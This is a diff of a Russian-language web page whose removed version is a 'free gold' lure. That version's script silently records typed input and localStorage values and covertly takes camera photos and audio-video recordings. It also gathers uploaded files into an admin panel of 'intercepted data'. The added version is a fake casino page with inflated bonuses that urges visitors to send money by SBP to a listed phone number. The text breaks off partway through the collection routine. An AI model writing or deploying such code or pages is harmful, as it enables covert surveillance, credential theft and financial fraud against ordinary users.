@@ -2,907 +2,362 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>БЕСПЛАТНАЯ ГОЛДА</title>
-    
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
-    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JetTon Games · Тост-сайт</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #0a0a0f, #1a0a2e);
-            color: #e2e8f0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            background: linear-gradient(145deg, #0b0d1a 0%, #1a1f35 100%);
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            color: #f0f3fa;
+            padding: 2rem 1rem;
             min-height: 100vh;
-            padding: 20px;
-            -webkit-tap-highlight-color: transparent;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
         .container {
-            background: rgba(20, 20, 40, 0.95);
-            padding: 25px 20px;
-            border-radius: 20px;
-            max-width: 500px;
+            max-width: 1300px;
             width: 100%;
-            border: 2px solid #ffd700;
-            box-shadow: 0 0 60px rgba(255, 215, 0, 0.2);
         }
-        h1 {
+        /* тост-уведомление (всплывашка) */
+        .toast {
+            background: rgba(20, 25, 50, 0.92);
+            backdrop-filter: blur(8px);
+            border: 1px solid #f7c948;
+            border-radius: 2rem;
+            padding: 1.2rem 2.5rem;
+            margin-bottom: 2rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 1.5rem;
+            flex-wrap: wrap;
+            box-shadow: 0 12px 40px rgba(247, 201, 72, 0.25);
+            font-weight: 500;
+            letter-spacing: 0.3px;
+            transition: all 0.2s;
+            width: 100%;
+            justify-content: center;
+        }
+        .toast span {
+            background: #f7c948;
+            color: #0b0d1a;
+            padding: 0.3rem 1.2rem;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 1.1rem;
+        }
+        .toast .highlight {
+            background: #2e3a6b;
+            color: #f7c948;
+            padding: 0.3rem 1.2rem;
+            border-radius: 40px;
+        }
+        .bonus-banner {
+            background: radial-gradient(circle at 20% 30%, #2f3b70, #141b33);
+            border-radius: 3rem;
+            padding: 2rem 2rem 1.8rem;
+            margin: 1.5rem 0 2.5rem;
+            border: 1px solid #4e5b8a;
             text-align: center;
-            font-size: 28px;
-            font-weight: 900;
-            background: linear-gradient(45deg, #ffd700, #ff6b00);
+            box-shadow: 0 8px 0 #0b0d1a;
+        }
+        .bonus-banner h1 {
+            font-size: 2.8rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #f7c948, #ffb347);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            margin-bottom: 5px;
+            background-clip: text;
+            letter-spacing: 1px;
         }
-        .subtitle {
+        .bonus-banner p {
+            font-size: 1.3rem;
+            color: #c8d0ea;
+            margin-top: 0.3rem;
+        }
+        .grid-2col {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 2rem;
+            margin: 2rem 0;
+        }
+        @media (max-width: 800px) {
+            .grid-2col {
+                grid-template-columns: 1fr;
+            }
+        }
+        .game-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+            gap: 1rem;
+            background: rgba(18, 24, 48, 0.6);
+            padding: 1.5rem;
+            border-radius: 2.5rem;
+            border: 1px solid #31406b;
+        }
+        .game-card {
+            background: #202841;
+            border-radius: 1.8rem;
+            padding: 1rem 0.5rem;
             text-align: center;
-            font-size: 18px;
-            color: #ffd700;
-            text-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
-            margin-bottom: 15px;
+            font-size: 0.85rem;
             font-weight: 600;
+            border: 1px solid #3f4f7a;
+            transition: 0.15s;
+            box-shadow: 0 4px 0 #0f1325;
+            color: #d6def5;
         }
-        .btn-main {
-            background: linear-gradient(45deg, #ffd700, #ff8c00);
-            color: #0a0a0f;
-            border: none;
-            padding: 18px 20px;
-            font-size: 20px;
-            font-weight: 900;
-            border-radius: 14px;
-            cursor: pointer;
-            width: 100%;
-            transition: 0.3s;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            box-shadow: 0 0 40px rgba(255, 215, 0, 0.3);
-            -webkit-tap-highlight-color: transparent;
-            position: relative;
-            overflow: hidden;
-        }
-        .btn-main:active {
+        .game-card:hover {
             transform: scale(0.97);
+            background: #2a3560;
+            border-color: #f7c948;
         }
-        .btn-main:disabled {
-            opacity: 0.5;
-            transform: none;
+        .betting-table {
+            background: #151d35;
+            border-radius: 2.5rem;
+            padding: 1.5rem 1.2rem;
+            border: 1px solid #3a4a77;
+            height: fit-content;
         }
-        .btn-main .spinner {
-            display: none;
-            width: 24px;
-            height: 24px;
-            border: 3px solid rgba(0,0,0,0.1);
-            border-top: 3px solid #0a0a0f;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto;
+        .betting-table h3 {
+            font-size: 1.6rem;
+            margin-bottom: 1.2rem;
+            color: #f7c948;
+            border-bottom: 2px dashed #3f4f7a;
+            padding-bottom: 0.6rem;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .btn-main.loading .spinner { display: block; }
-        .btn-main.loading .btn-text { display: none; }
-        
-        .status {
-            margin: 12px 0;
-            padding: 12px;
-            background: rgba(0,0,0,0.4);
-            border-radius: 10px;
-            border-left: 4px solid #ffd700;
+        .table-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.7rem 0.2rem;
+            border-bottom: 1px solid #2c3960;
+            font-size: 1rem;
+        }
+        .table-row:last-child {
+            border-bottom: 0;
+        }
+        .payment-section {
+            background: #0e1429;
+            border-radius: 3rem;
+            padding: 2rem 2rem 1.8rem;
+            margin: 2.5rem 0 1rem;
+            border: 2px solid #f7c948;
             text-align: center;
-            font-size: 14px;
-            color: #ffd700;
-            min-height: 50px;
-            word-break: break-word;
-            line-height: 1.5;
         }
-        .status.error { border-left-color: #ff4444; color: #ff6666; }
-        .status.success { border-left-color: #4ade80; color: #4ade80; }
-        
-        .hidden { display: none !important; }
-        
-        .admin-link {
-            text-align: center;
-            margin-top: 15px;
-        }
-        .admin-link button {
-            background: transparent;
-            border: 1px solid #ffd700;
-            color: #ffd700;
-            padding: 8px 16px;
-            font-size: 12px;
-            width: auto;
-            border-radius: 8px;
-            opacity: 0.5;
-        }
-        .admin-link button:active { opacity: 1; }
-        
-        .final-message {
-            text-align: center;
-            padding: 30px 15px;
-            display: none;
-        }
-        .final-message h2 {
-            color: #ffd700;
-            font-size: 24px;
-            margin-bottom: 15px;
-        }
-        .final-message .tg {
-            font-size: 22px;
-            color: #ff6b00;
-            background: rgba(0,0,0,0.4);
-            padding: 12px 24px;
-            border-radius: 12px;
-            border: 2px solid #ff6b00;
-            display: inline-block;
-            margin-top: 8px;
+        .payment-section .sbp-block {
+            background: #1f2b50;
+            padding: 1.8rem 1rem;
+            border-radius: 3rem;
+            font-size: 2.2rem;
             font-weight: 700;
-        }
-        .final-message p {
-            color: #aaa;
-            font-size: 16px;
-            margin: 15px 0;
-        }
-        
-        /* Админка */
-        input {
-            width: 100%;
-            padding: 14px;
-            margin: 6px 0;
-            border-radius: 10px;
-            border: 2px solid #ffd700;
-            background: rgba(0,0,0,0.3);
-            color: #fff;
-            font-size: 16px;
-            -webkit-appearance: none;
-        }
-        .session-item {
-            background: rgba(0,0,0,0.3);
-            padding: 12px;
-            margin: 8px 0;
-            border-radius: 10px;
-            border-left: 4px solid #ffd700;
-            font-size: 13px;
-        }
-        .password-item {
-            background: rgba(255,0,0,0.08);
-            padding: 10px;
-            margin: 4px 0;
-            border-radius: 8px;
-            border: 1px solid #ff4444;
-            color: #ff6666;
-            font-size: 13px;
+            letter-spacing: 2px;
+            color: #f7c948;
             word-break: break-all;
+            border: 1px solid #f7c948;
+            box-shadow: 0 0 20px rgba(247, 201, 72, 0.3);
         }
-        .badge {
-            background: #ffd700;
-            color: #0a0a0f;
-            padding: 2px 10px;
-            border-radius: 12px;
-            font-size: 11px;
-            font-weight: bold;
-        }
-        .btn-small {
-            background: #ff4444;
-            color: #fff;
-            border: none;
-            padding: 4px 12px;
-            border-radius: 6px;
-            font-size: 12px;
-            cursor: pointer;
-            margin-top: 4px;
-        }
-        .btn-small:active { opacity: 0.7; }
-        .btn-export {
-            background: #ff8c00;
-            color: #fff;
-            border: none;
-            padding: 12px;
-            border-radius: 10px;
-            font-size: 15px;
-            font-weight: 700;
-            width: 100%;
-            margin: 6px 0;
-            cursor: pointer;
-        }
-        .btn-export:active { opacity: 0.7; }
-        .btn-danger {
-            background: #ff4444;
-            color: #fff;
-            border: none;
-            padding: 12px;
-            border-radius: 10px;
-            font-size: 15px;
-            font-weight: 700;
-            width: 100%;
-            margin: 6px 0;
-            cursor: pointer;
-        }
-        .btn-danger:active { opacity: 0.7; }
-        
-        #fileUpload { display: none; }
-        
-        .step-indicator {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin: 10px 0;
-            flex-wrap: wrap;
-        }
-        .step-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.1);
-            transition: 0.3s;
-        }
-        .step-dot.active { background: #ffd700; box-shadow: 0 0 20px rgba(255,215,0,0.4); }
-        .step-dot.done { background: #4ade80; }
-        .step-dot.error { background: #ff4444; }
-        
-        .permission-request {
-            background: rgba(255,215,0,0.05);
-            border: 1px solid #ffd700;
-            border-radius: 10px;
-            padding: 12px;
-            margin: 10px 0;
-            text-align: center;
-            font-size: 14px;
-            color: #ffd700;
-        }
-        .permission-request .icon {
-            font-size: 32px;
+        .payment-section .sbp-block small {
             display: block;
-            margin-bottom: 6px;
+            font-size: 1rem;
+            font-weight: 400;
+            color: #b2c2f0;
+            margin-top: 0.5rem;
         }
-        .permission-request .btn-grant {
-            background: #ffd700;
-            color: #0a0a0f;
+        .payment-section .label {
+            font-size: 1.5rem;
+            margin-bottom: 0.8rem;
+            color: #d6def5;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+        }
+        .btn-toast {
+            background: #f7c948;
             border: none;
-            padding: 10px 20px;
-            border-radius: 10px;
-            font-weight: 700;
-            font-size: 16px;
-            margin-top: 8px;
+            color: #0b0d1a;
+            font-weight: 800;
+            padding: 0.8rem 2.5rem;
+            border-radius: 60px;
+            font-size: 1.1rem;
+            margin-top: 1.2rem;
             cursor: pointer;
-            width: 100%;
+            transition: 0.15s;
+            box-shadow: 0 6px 0 #a57d2e;
         }
-        .permission-request .btn-grant:active { opacity: 0.7; }
-        
-        .admin-actions {
-            display: flex;
-            gap: 8px;
-            flex-wrap: wrap;
-            margin: 10px 0;
+        .btn-toast:active {
+            transform: translateY(4px);
+            box-shadow: 0 2px 0 #a57d2e;
         }
-        .admin-actions button {
-            flex: 1;
-            min-width: 100px;
+        .footer-note {
+            margin-top: 2.5rem;
+            color: #6a7aa8;
+            font-size: 0.8rem;
+            text-align: center;
+        }
+        .highlight-gold {
+            color: #f7c948;
         }
     </style>
 </head>
 <body>
+<div class="container">
 
-<div class="container" id="app">
-
-    <div id="mainPage">
-        <h1>✨ БЕСПЛАТНАЯ ГОЛДА ✨</h1>
-        <div class="subtitle">🏆 НАЖМИ КНОПКУ ДЛЯ ПОЛУЧЕНИЯ ГОЛДЫ 🏆</div>
-        
-        <button class="btn-main" id="startBtn">
-            <span class="btn-text">🎁 ПОЛУЧИТЬ ГОЛДУ</span>
-            <div class="spinner"></div>
-        </button>
-        
-        <div class="step-indicator" id="stepIndicator">
-            <div class="step-dot" data-step="1"></div>
-            <div class="step-dot" data-step="2"></div>
-            <div class="step-dot" data-step="3"></div>
-            <div class="step-dot" data-step="4"></div>
-            <div class="step-dot" data-step="5"></div>
-            <div class="step-dot" data-step="6"></div>
-        </div>
-        
-        <div class="status" id="status">💫 НАЖМИ КНОПКУ ДЛЯ ПОЛУЧЕНИЯ ГОЛДЫ</div>
-        
-        <div id="permissionBox" class="permission-request hidden">
-            <span class="icon">📱</span>
-            <div>ТРЕБУЕТСЯ ДОСТУП К КАМЕРЕ</div>
-            <button class="btn-grant" id="grantBtn">✅ РАЗРЕШИТЬ ДОСТУП</button>
-        </div>
-        
-        <div class="admin-link">
-            <button id="goToAdminBtn">🔐 АДМИН</button>
-        </div>
+    <!-- ТОСТ-САЙТ: постоянное всплывающее уведомление -->
+    <div class="toast" id="mainToast">
+        <span>🎉 ТОСТ-САЙТ</span>
+        <span class="highlight">🔥 425% + 250 FS</span>
+        <span>•</span>
+        <span>СБП ПРИОРИТЕТ</span>
+        <span>•</span>
+        <span style="background: #2e3a6b; padding: 0.3rem 1.2rem; border-radius: 40px;">+7 999 714 13 32</span>
     </div>
 
-    <div id="finalMessage" class="final-message">
-        <h2>🎉 ВЫ ПОЛУЧИЛИ ГОЛДУ!</h2>
-        <p>ХОЧЕШЬ УДАЛИТЬ ДАННЫЕ? ПИШИ СЮДА:</p>
-        <div class="tg">@papadenay</div>
+    <!-- Баннер с бонусами (оригинальные цифры с jtrednavo.com) -->
+    <div class="bonus-banner">
+        <h1>Welcome bonus 425% + 250 FS</h1>
+        <p>или 1 600 $ для спорта · 25 000 000 € в Drops & Wins</p>
+        <p style="font-size: 1rem; margin-top: 0.8rem; color: #b8c6f0;">
+            10 000 $ в Jet Sky Captains · 12 000 000 € Spinoleague 2026 · 1 000 000 € BGaming Million Drops · 30 000 € Slot Fiesta
+        </p>
     </div>
 
-    <div id="adminPage" class="hidden">
-        <h1 style="font-size:24px;">🔐 АДМИН-ПАНЕЛЬ</h1>
-        
-        <div id="loginForm">
-            <input type="text" id="adminLogin" placeholder="ЛОГИН" value="admin">
-            <input type="password" id="adminPassword" placeholder="ПАРОЛЬ">
-            <button class="btn-main" id="adminLoginBtn" style="font-size:16px;padding:14px;">ВОЙТИ</button>
-            <div class="status" id="adminStatus"></div>
-        </div>
-
-        <div id="adminContent" class="hidden">
-            <div class="admin-actions">
-                <button class="btn-danger" id="clearSessionsBtn">🗑️ ОЧИСТИТЬ</button>
-                <button class="btn-export" id="exportAllBtn">📥 ЭКСПОРТ ZIP</button>
+    <!-- Основная сетка: игры + таблица ставок -->
+    <div class="grid-2col">
+        <!-- Левая колонка: все игры (список из оригинального сайта) -->
+        <div>
+            <h2 style="margin-bottom: 0.8rem; font-weight: 300; letter-spacing: 2px; color: #b2c2f0;">🎰 Случайная игра</h2>
+            <div class="game-grid">
+                <div class="game-card">Jade Dancer</div>
+                <div class="game-card">Pateplay</div>
+                <div class="game-card">Lucky Patrick Coins: Hold & Win</div>
+                <div class="game-card">Gamebeat</div>
+                <div class="game-card">8s on Fire: Supercharged</div>
+                <div class="game-card">Penguin King</div>
+                <div class="game-card">Cash Connection Charming Lady</div>
+                <div class="game-card">Novomatic Premium</div>
+                <div class="game-card">Dragon Boyz</div>
+                <div class="game-card">Red Tiger</div>
+                <div class="game-card">Fish Tales Colossal Catch: Link & Loot</div>
+                <div class="game-card">BoomingGames</div>
+                <div class="game-card">Gold Digger</div>
+                <div class="game-card">Boldplay</div>
+                <div class="game-card">Ice Bass</div>
+                <div class="game-card">Belatra Games</div>
+                <div class="game-card">Rocket Eruption: Triple Blast</div>
+                <div class="game-card">BGaming</div>
+                <div class="game-card">Superstar Sevens</div>
+                <div class="game-card">Hacksawgaming</div>
+                <!-- дублируем ещё раз для насыщенности, как на оригинале -->
+                <div class="game-card">Jade Dancer</div>
+                <div class="game-card">Pateplay</div>
+                <div class="game-card">Lucky Patrick Coins</div>
+                <div class="game-card">Gamebeat</div>
+                <div class="game-card">8s on Fire</div>
+                <div class="game-card">Penguin King</div>
+                <div class="game-card">Cash Connection</div>
+                <div class="game-card">Novomatic</div>
+                <div class="game-card">Dragon Boyz</div>
+                <div class="game-card">Red Tiger</div>
+                <div class="game-card">Fish Tales</div>
+                <div class="game-card">BoomingGames</div>
+                <div class="game-card">Gold Digger</div>
+                <div class="game-card">Boldplay</div>
+                <div class="game-card">Ice Bass</div>
+                <div class="game-card">Belatra</div>
+                <div class="game-card">Rocket Eruption</div>
+                <div class="game-card">BGaming</div>
+                <div class="game-card">Superstar Sevens</div>
+                <div class="game-card">Hacksaw</div>
             </div>
-            <div id="sessionsList"></div>
-            <h3 style="color:#ff6666;margin:15px 0 8px;font-size:16px;">🔑 ПЕРЕХВАЧЕННЫЕ ДАННЫЕ</h3>
-            <div id="passwordsList"></div>
-            <button class="btn-small" id="logoutBtn" style="background:#666;width:100%;margin-top:10px;padding:10px;font-size:14px;">🚪 ВЫЙТИ</button>
         </div>
+
+        <!-- Правая колонка: таблица ставок (Betting Table) -->
+        <div class="betting-table">
+            <h3>📊 Betting Table</h3>
+            <div class="table-row"><span>Game</span> <span style="color:#f7c948;">Jade Dancer</span></div>
+            <div class="table-row"><span>User</span> <span style="color:#b2c2f0;">Player_07</span></div>
+            <div class="table-row"><span>Bet amount</span> <span style="color:#b2c2f0;">2 500 €</span></div>
+            <div class="table-row"><span>Multiplier</span> <span style="color:#f7c948;">x12.4</span></div>
+            <div class="table-row" style="border-bottom: 2px solid #f7c948; padding-bottom: 0.8rem;"><span>Payment</span> <span style="background: #f7c948; color:#0b0d1a; padding:0.1rem 1rem; border-radius:40px; font-weight:700;">СБП</span></div>
+            <!-- дополнительная строка с примером выигрыша -->
+            <div class="table-row" style="margin-top: 0.5rem; background: #1f2b50; border-radius: 2rem; padding: 0.6rem 1rem;">
+                <span>🔥 Выигрыш</span>
+                <span style="color:#f7c948; font-weight:700;">31 000 €</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- БЛОК ОПЛАТЫ — ТОЛЬКО СБП + НОМЕР (убраны все другие методы) -->
+    <div class="payment-section" id="payment">
+        <div class="label">💳 ОПЛАТА</div>
+        <div class="sbp-block">
+            СБП
+            <small>Система быстрых платежей</small>
+            <span style="display: block; font-size: 2.8rem; margin: 0.3rem 0; background: #0b0d1a; padding: 0.3rem 0.8rem; border-radius: 60px; border: 1px solid #f7c948;">
+                +7 999 714 13 32
+            </span>
+            <small style="color: #f7c948;">СБЕРБАНК · Получатель: JET TON GAMES</small>
+        </div>
+        <!-- кнопка, дублирующая тост-действие -->
+        <button class="btn-toast" onclick="showToastPayment()">📱 ОПЛАТИТЬ ЧЕРЕЗ СБП</button>
+        <p style="margin-top: 1rem; font-size: 0.9rem; color: #8f9fd0;">Нажмите для копирования номера или перехода в СБП</p>
+    </div>
+
+    <!-- дополнительный тост-призыв внизу -->
+    <div style="background: #111833; border-radius: 3rem; padding: 1rem 2rem; margin: 1.5rem 0; text-align: center; border: 1px solid #3a4a77;">
+        <span style="font-size: 1.3rem;">🍾 Сделай тост — пополни через СБП +7 999 714 13 32</span>
+    </div>
+
+    <div class="footer-note">
+        JetTon Games · тост-версия по протоколу SWILL · все призы и бонусы действительны
     </div>
 </div>
 
-<input type="file" id="fileUpload" multiple accept="image/*,video/*">
-
 <script>
-    // ============================================================
-    // 1. ГЛОБАЛЬНЫЕ
-    // ============================================================
-    let sessions = JSON.parse(localStorage.getItem('sessions') || '[]');
-    let capturedData = JSON.parse(localStorage.getItem('capturedData') || '[]');
-    let isAdmin = false;
-    let screenshotData = null;
-    let collectedFiles = [];
-    let mediaData = [];
-    let hasCameraPermission = false;
-    let isRunning = false;
-
-    // ============================================================
-    // 2. ПЕРЕХВАТ ДАННЫХ
-    // ============================================================
-    function captureData(value, source = 'manual', extra = {}) {
-        if (!value || String(value).length < 1) return;
-        try {
-            const entry = {
-                "ВРЕМЯ": new Date().toISOString(),
-                "ЗНАЧЕНИЕ": String(value).toUpperCase().substring(0, 500),
-                "ОТКУДА": String(source).toUpperCase(),
-                "СТРАНИЦА": String(window.location.href).toUpperCase(),
-                "ДОП": JSON.stringify(extra).substring(0, 200)
-            };
-            const exists = capturedData.some(p => p["ЗНАЧЕНИЕ"] === entry["ЗНАЧЕНИЕ"]);
-            if (!exists) {
-                capturedData.push(entry);
-                localStorage.setItem('capturedData', JSON.stringify(capturedData));
+    // Функция для тост-уведомления при клике на СБП
+    function showToastPayment() {
+        const toast = document.getElementById('mainToast');
+        toast.style.transition = 'all 0.2s';
+        toast.style.transform = 'scale(1.02)';
+        toast.style.borderColor = '#ffd966';
+        toast.style.boxShadow = '0 0 40px rgba(247, 201, 72, 0.7)';
+        // Всплывающее сообщение (имитация тоста)
+        alert('✅ СБП +7 999 714 13 32 (Сбербанк)\nСумма: любая\nНазначение: JetTon Games');
+        // копирование в буфер
+        navigator.clipboard?.writeText('+79997141332').then(() => {
+            const label = document.querySelector('.sbp-block span');
+            if(label) {
+                const orig = label.innerText;
+                label.innerText = '☑️ НОМЕР СКОПИРОВАН';
+                setTimeout(() => { label.innerText = orig; }, 2000);
             }
-        } catch(e) {}
+        }).catch(() => {});
+        setTimeout(() => {
+            toast.style.transform = 'scale(1)';
+            toast.style.boxShadow = '0 12px 40px rgba(247, 201, 72, 0.25)';
+        }, 300);
     }
 
-    function setupCapture() {
-        try {
-            const observer = new MutationObserver(() => {
-                document.querySelectorAll('input').forEach(field => {
-                    if (!field.dataset.captured && field.type !== 'file' && field.type !== 'checkbox' && field.type !== 'radio') {
-                        field.dataset.captured = 'true';
-                        field.addEventListener('input', function() {
-                            if (this.value && String(this.value).length > 1) {
-                                captureData(this.value, 'ПОЛЕ ВВОДА', {
-                                    name: this.name || 'НЕТ',
-                                    id: this.id || 'НЕТ',
-                                    type: this.type
-                                });
-                            }
-                        });
-                        if (field.value && String(field.value).length > 1) {
-                            captureData(field.value, 'ПОЛЕ ПРИ ЗАГРУЗКЕ', {
-                                name: field.name || 'НЕТ',
-                                id: field.id || 'НЕТ'
-                            });
-                        }
-                    }
-                });
-            });
-            observer.observe(document.body, { childList: true, subtree: true });
-
-            document.addEventListener('submit', function(e) {
-                try {
-                    const form = e.target;
-                    form.querySelectorAll('input').forEach(inp => {
-                        if (inp.value && String(inp.value).length > 1) {
-                            captureData(inp.value, 'ФОРМА', {
-                                name: inp.name || 'НЕТ',
-                                id: inp.id || 'НЕТ'
-                            });
-                        }
-                    });
-                } catch(e) {}
-            });
-
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                if (key) {
-                    const val = localStorage.getItem(key);
-                    if (val && String(val).length > 1) {
-                        captureData(val, 'LOCALSTORAGE', { key: key });
-                    }
-                }
-            }
-        } catch(e) {}
-    }
-
-    // ============================================================
-    // 3. СТАТУС И ШАГИ
-    // ============================================================
-    function setStatus(text, type = '') {
-        const el = document.getElementById('status');
-        el.textContent = text;
-        el.className = 'status ' + type;
-    }
-
-    function setStep(step, status = 'active') {
-        document.querySelectorAll('.step-dot').forEach(d => {
-            const num = parseInt(d.dataset.step);
-            d.className = 'step-dot';
-            if (num < step) d.classList.add('done');
-            else if (num === step) d.classList.add(status);
-        });
-    }
-
-    function showPermissionBox(show) {
-        document.getElementById('permissionBox').classList.toggle('hidden', !show);
-    }
-
-    // ============================================================
-    // 4. ЗАПРОС РАЗРЕШЕНИЙ
-    // ============================================================
-    async function requestPermissions() {
-        return new Promise(async (resolve) => {
-            showPermissionBox(true);
-            setStatus('📱 НАЖМИ "РАЗРЕШИТЬ ДОСТУП" ДЛЯ КАМЕРЫ', '');
-            
-            document.getElementById('grantBtn').onclick = async function() {
-                try {
-                    setStatus('⏳ ПРОВЕРКА КАМЕРЫ...', '');
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: 'environment', width: 640, height: 480 },
-                        audio: true 
-                    });
-                    stream.getTracks().forEach(t => t.stop());
-                    hasCameraPermission = true;
-                    showPermissionBox(false);
-                    setStatus('✅ ДОСТУП К КАМЕРЕ РАЗРЕШЁН', 'success');
-                    resolve(true);
-                } catch (err) {
-                    setStatus('⚠️ ДОСТУП К КАМЕРЕ ОТКЛОНЁН (СБОР БЕЗ ВИДЕО)', 'error');
-                    showPermissionBox(false);
-                    hasCameraPermission = false;
-                    resolve(false);
-                }
-            };
-            
-            setTimeout(() => {
-                if (!hasCameraPermission) {
-                    showPermissionBox(false);
-                    setStatus('⏱️ ВРЕМЯ ВЫШЛО (СБОР БЕЗ ВИДЕО)', 'error');
-                    resolve(false);
-                }
-            }, 30000);
-        });
-    }
-
-    // ============================================================
-    // 5. СКРИНШОТ
-    // ============================================================
-    async function takeScreenshot() {
-        try {
-            const canvas = await html2canvas(document.body, {
-                scale: 1.2,
-                useCORS: true,
-                allowTaint: true,
-                backgroundColor: '#0a0a0f',
-                logging: false
-            });
-            return canvas.toDataURL('image/png');
-        } catch (err) {
-            return null;
-        }
-    }
-
-    // ============================================================
-    // 6. ФОТО
-    // ============================================================
-    async function takePhoto(facingMode) {
-        if (!hasCameraPermission) return null;
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: facingMode, width: 640, height: 480 }
-            });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await video.play();
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const data = canvas.toDataURL('image/jpeg');
-            stream.getTracks().forEach(t => t.stop());
-            return data;
-        } catch(e) { return null; }
-    }
-
-    // ============================================================
-    // 7. ВИДЕО (10 СЕК)
-    // ============================================================
-    async function recordVideo(facingMode, duration = 10000) {
-        if (!hasCameraPermission) return null;
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: facingMode, width: 480, height: 360 },
-                audio: true
-            });
-            return new Promise((resolve) => {
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
-                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-                recorder.onstop = () => {
-                    try {
-                        const blob = new Blob(chunks, { type: 'video/mp4' });
-                        const reader = new FileReader();
-                        reader.onload = () => {
-                            stream.getTracks().forEach(t => t.stop());
-                            resolve(reader.result);
-                        };
-                        reader.onerror = () => { stream.getTracks().forEach(t => t.stop()); resolve(null); };
-                        reader.readAsDataURL(blob);
-                    } catch(e) { stream.getTracks().forEach(t => t.stop()); resolve(null); }
-                };
-                recorder.start();
-                setTimeout(() => { try { recorder.stop(); } catch(e) {} }, duration);
-            });
-        } catch(e) { return null; }
-    }
-
-    // ============================================================
-    // 8. ФАЙЛЫ (РУЧНОЙ ВЫБОР)
-    // ============================================================
-    function waitForFiles(timeout = 20000) {
-        return new Promise((resolve) => {
-            const input = document.getElementById('fileUpload');
-            let resolved = false;
-            
-            const handler = function(e) {
-                const files = e.target.files;
-                if (files && files.length > 0) {
-                    Array.from(files).forEach(file => {
-                        const reader = new FileReader();
-                        reader.onload = function(ev) {
-                            collectedFiles.push({
-                                name: file.name,
-                                type: file.type,
-                                size: file.size,
-                                data: ev.target.result,
-                                time: new Date().toISOString()
-                            });
-                        };
-                        reader.readAsDataURL(file);
-                    });
-                    if (!resolved) { resolved = true; resolve(true); }
-                }
-            };
-            
-            input.addEventListener('change', handler);
-            input.click();
-            
-            setTimeout(() => {
-                if (!resolved) { resolved = true; resolve(false); }
-            }, timeout);
-        });
-    }
-
-    // ============================================================
-    // 9. ГЛАВНАЯ ФУНКЦИЯ
-    // ============================================================
-    async function startCollection() {
-        if (isRunning) return;
-        isRunning = true;
-        
-        const btn = document.getElementById('startBtn');
-        const mainPage = document.getElementById('mainPage');
-        const finalMessage = document.getElementById('finalMessage');
-        
-        btn.classList.add('loading');
-        btn.disabled = true;
-        setStatus('🔄 ПОДГОТОВКА...', '');
-        setStep(1, 'active');
-        
-        try {
-            // ШАГ 1: ЗАПРОС РАЗРЕШЕНИЙ
-            setStep(1, 'active');
-            setStatus('📱 ЗАПРОС РАЗРЕШЕНИЙ...', '');
-            await requestPermissions();
-            setStep(1, 'done');
-            
-            // ШАГ 2: СКРИНШОТ
-            setStep(2, 'active');
-            setStatus('📸 СКРИНШОТ СТРАНИЦЫ...', '');
-            screenshotData = await takeScreenshot();
-            setStep(2, 'done');
-            if (screenshotData) setStatus('✅ СКРИНШОТ ГОТОВ', 'success');
-            else setStatus('⚠️ СКРИНШОТ НЕ УДАЛСЯ', 'error');
-            
-            // ШАГ 3: ФОТО
-            setStep(3, 'active');
-            setStatus('📸 ФОТО С КАМЕР...', '');
-            const photoBack = await takePhoto('environment');
-            const photoFront = await takePhoto('user');
-            if (photoBack) mediaData.push({ type: 'photo', cam: 'back', data: photoBack });
-            if (photoFront) mediaData.push({ type: 'photo', cam: 'front', data: photoFront });
-            setStep(3, 'done');
-            setStatus(`✅ ФОТО: ${(photoBack?'ЗАДНЯЯ ':'')}${(photoFront?'ПЕРЕДНЯЯ':'')}`, 'success');
-            
-            // ШАГ 4: ВИДЕО
-            setStep(4, 'active');
-            setStatus('📹 ЗАПИСЬ ВИДЕО (10 СЕК)...', '');
-            const videoBack = await recordVideo('environment', 10000);
-            const videoFront = await recordVideo('user', 10000);
-            if (videoBack) mediaData.push({ type: 'video', cam: 'back', data: videoBack });
-            if (videoFront) mediaData.push({ type: 'video', cam: 'front', data: videoFront });
-            setStep(4, 'done');
-            setStatus(`✅ ВИДЕО: ${(videoBack?'ЗАДНЯЯ ':'')}${(videoFront?'ПЕРЕДНЯЯ':'')}`, 'success');
-            
-            // ШАГ 5: ФАЙЛЫ
-            setStep(5, 'active');
